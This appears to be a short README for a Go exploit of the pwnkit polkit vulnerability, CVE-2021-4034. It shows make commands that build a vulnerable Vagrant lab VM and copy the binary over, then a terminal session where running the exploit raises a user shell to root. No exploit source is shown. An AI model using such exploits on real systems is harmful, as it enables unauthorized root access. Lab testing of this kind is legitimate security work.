### Pwnkit-go

This is a working exploit for the pwnkit vulnerability, CVE-2021-4034, written in Go

Give it a try:

```sh
# create a vulnerable vagrant machine
$ make vm
...

# build the binary and scp it to the vagrant box
$  make scp

# ssh onto the vagrant box
$ make ssh

vagrant@ubuntu-focal:/tmp$ whoami
vagrant

vagrant@ubuntu-focal:$ 
vagrant@ubuntu-focal:/tmp$ cd /tmp && ./pwnkit-go
$ whoami
root
```
